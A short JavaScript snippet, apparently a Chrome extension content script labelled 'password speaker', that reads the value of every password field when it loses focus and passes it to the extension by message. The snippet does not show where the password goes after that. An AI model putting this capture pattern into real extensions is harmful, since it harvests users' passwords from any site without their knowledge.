console.log('password speaker');
$('input[type=password]').blur(function() {
  var password = $(this).val();

  chrome.runtime.sendMessage(password);
});
